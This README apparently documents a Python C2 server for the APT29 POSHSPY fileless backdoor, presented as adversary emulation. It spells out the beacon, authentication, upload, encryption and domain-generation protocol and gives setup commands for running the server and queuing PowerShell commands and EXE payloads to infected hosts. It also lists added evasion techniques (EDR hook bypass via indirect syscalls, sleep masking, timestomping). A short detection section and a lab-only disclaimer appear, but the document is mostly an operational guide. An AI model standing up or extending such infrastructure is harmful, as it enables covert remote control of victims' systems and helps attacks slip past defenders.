# POSHSPY 2026 — APT29 C2 Server

> Python C2 server implementation for the POSHSPY backdoor protocol.
> Original client: Mandiant — *Dissecting One of APT29's Fileless WMI and
> PowerShell Backdoors* (April 2017) [55]
> This server: original research — protocol-accurate Python implementation
> that interoperates with the documented PowerShell client.

---

## Overview

Mandiant published a full analysis and source code of POSHSPY in 2017.
The client (POSHSPY.ps1) was documented completely. The C2 server that
operated it was never published.

This module builds the missing piece — a Python/Flask server that speaks
the exact same protocol the PS1 client implements, using the same crypto,
the same auth token handshake, the same chunked upload mechanics, and the
same DGA to predict which URLs the client will beacon to.

**This is the original research contribution of the cozy-bear-emulation
project** — a fully protocol-accurate POSHSPY C2 server attributed to the
Mandiant primary source, with 2026 evasion additions layered on top.

---

## File Structure

```
tools/poshspy/
├── client/
│   └── poshspy.ps1          # Original Mandiant sample (cited [55])
├── server/
│   ├── crypto.py            # VC class — AES/RSA/PKI crypto
│   ├── protocol.py          # Auth token, chunk upload, ACK
│   ├── dga.py               # URL generation — matches PS1 exactly
│   └── server.py            # Flask C2 server
├── keys/
│   ├── server_priv.pem      # Server keypair (generate — see below)
│   ├── server_pub.pem       # Server public key
│   ├── client_priv.pem      # Client keypair
│   └── client_pub.pem       # Client public key
└── README.md
```

---

## Protocol — Primary Source Attribution

Every protocol component attributed to the Mandiant POSHSPY report [55]
and the published PS1 source.

### Request Cycle

```
Client                              Server
──────                              ──────
GET /index.html                →   200 OK (decoy — downloadData())
GET /url                       →   200 + Set-Cookie: tok=<token>
  Cookie: ckName=ckVal              (getAuthToken() — 2 requests)

GET /url                       →   200 + encrypted payload body
  Cookie: ckName=ckVal;            (downloadDataAuth())
          <rand>=<auCookie>

GET /url?id=x&s=y              →   200 + Set-Cookie: ACK
  Cookie: ckName=ckVal;            (uploadChunk() — per 2048B chunk)
          <rand>=<auCookie>;
          <rand>=<hexdata>;
          (<rand>=<tsize/2>)        <- final chunk only
```

### Auth Token Handshake

```
Source: getAuthToken(), createAuthCookieVal(), checkRespCk()

1. Server issues random token in Set-Cookie
2. Client computes: auCookie = SHA1(SHA1(password) + token)
3. Client sends auCookie in subsequent requests
4. Server verifies: expected == SHA1(SHA1(password) + token)
5. Upload ACK: SHA1(SHA1(auCookie) + password)
```

### Chunked Upload

```
Source: uploadDataAuth(), uploadChunk()

- Data hex-encoded (BitConverter format — lowercase, no dashes)
- Split into 2048-byte chunks
- Each chunk sent as cookie value
- Final chunk includes tsize/2 as additional cookie
- Server ACKs each chunk via Set-Cookie
- Client verifies ACK before sending next chunk
```

### Crypto Stack

```
Source: VC class — EncryptDataPki(), DecryptDataPki()

Outbound (server -> client):
  [128B RSA signature][128B RSA-enc AES key][AES-CBC encrypted data]
  Prepend random file signature (ico/gif/jpg/png/mp3/bmp) — VP.AddFS()

Inbound (client -> server):
  Strip 12-byte file signature — VP.RemoveFS()
  Verify RSA signature
  Decrypt AES key with RSA
  Decrypt data with AES

Keys: 1024-bit RSA, 256-bit AES, fixed IV (0xae2f2d23ec15765c...)
```

### DGA

```
Source: generateWorkUrl(), getDateParam(), generateRndHostName(),
        generatePathName()

Seed:   year*17 + month*13 + week*19 + mseed (834777)
Period: weekly (period=0)
RNG:    .NET System.Random — reimplemented as PSRandom in dga.py
Output: deterministic URL per week — same seed = same URL client beacons to
```

---

## 2026 Additions

Original POSHSPY behavior preserved exactly per Mandiant [55].
Novel additions for 2026 defensive environment:

| Addition | Detail | Rationale |
|----------|--------|-----------|
| AES payload storage | WMI property encrypted at rest | Original stored plaintext b64 |
| Indirect syscalls | WMI COM calls via RecycledGate | Elastic hook bypass |
| Sleep masking | Ekko RC4 during execution windows | Memory scanner evasion |
| Timestomping | Artifacts match pre-2013 System32 files | Original behavior preserved |

---

## Setup

### Generate Keys

```bash
cd tools/poshspy/keys

# server keypair
openssl genrsa -out server_priv.pem 1024
openssl rsa -in server_priv.pem -pubout -out server_pub.pem

# client keypair
openssl genrsa -out client_priv.pem 1024
openssl rsa -in client_priv.pem -pubout -out client_pub.pem
```

### Install Dependencies

```bash
pip install flask pycryptodome --break-system-packages
```

### Configure POSHSPY.ps1

Update PS1 variables to match generated keys and password:

```powershell
$cPairKey = "<base64 client keypair CSP blob>"
$sPubKey  = "<base64 server public key CSP blob>"
$pPass    = "<your chosen password>"
```

### Run Server

```bash
cd tools/poshspy/server
sudo python3 server.py
```

### Check This Week's C2 URL

```bash
python3 dga.py
# [*] Current C2 URL : http://www.<redacted>.org/variant/postscripts/php
```

### Queue Commands

```python
from server import queue_ps_command, queue_exe_payload

# PS command — delivered on next beacon
queue_ps_command('whoami')
queue_ps_command('Get-Process')

# EXE payload
queue_exe_payload(open('payload.exe','rb').read())
```

---

## Detection — Defensive Notes

Original POSHSPY detections per Mandiant [55]:

| Detection | Method |
|-----------|--------|
| WMI persistence | Enumerate WMI event subscriptions — BfeOnServiceStartTypeChange filter |
| Payload storage | Query RacTask class HiveUploadTask property |
| PowerShell logging | Script block logging captures payload on execution |
| Network | Infrequent beaconing, file magic headers on C2 traffic |

2026 additions change the detection surface:

| Addition | Detection Impact |
|----------|-----------------|
| AES WMI storage | WMI property query returns ciphertext — payload not recoverable without key |
| Indirect syscalls | ETW-TI call stack analysis defeated |
| Sleep masking | Memory scanner sees RC4 garbage during sleep windows |

---

## Primary Sources

| ID | Report | Author | Year |
|----|--------|--------|------|
| [55] | Dissecting One of APT29's Fileless WMI and PowerShell Backdoors | Mandiant / Matthew Dunwoody | 2017 |
| [37] | Deep Dive into Solorigate | MSTIC | 2021 |
| [10] | GoldMax, GoldFinder, and Sibot | MSTIC | 2021 |

---

## Disclaimer

For authorized adversary emulation against controlled lab infrastructure
(polar.local) only. Do not use against systems you do not own or have
explicit written authorization to test.